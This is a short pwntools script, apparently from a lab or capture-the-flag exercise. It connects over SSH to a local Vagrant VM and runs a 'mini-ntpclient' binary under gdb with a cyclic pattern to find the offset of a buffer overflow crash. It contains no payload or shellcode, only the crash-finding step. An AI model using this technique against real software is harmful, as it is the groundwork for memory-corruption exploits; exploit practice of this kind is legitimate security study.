from pwn import *
import base64

context.update(arch='i686', os='linux')

# Connect to the server with SSH
ssh_connection = ssh('vagrant', 'default', port=2222)

# Open a shell to write more stuff to
bash = ssh_connection.run('bash')

crash_at = 0x107

payload =  cyclic(crash_at)

a = str()
for i in payload:
 a += "\\x%x" % i


bash.sendline('ulimit -c unlimited')
#bash.sendline('/vagrant/mini-ntpclient ' +  payload.hex() )
bash.sendline('gdb /vagrant/mini-ntpclient')
#bash.sendline('run ' + str(a))
bash.sendline('run ' + str(cyclic(crash_at)))

# Hand an interactive shell back to the user
bash.interactive()

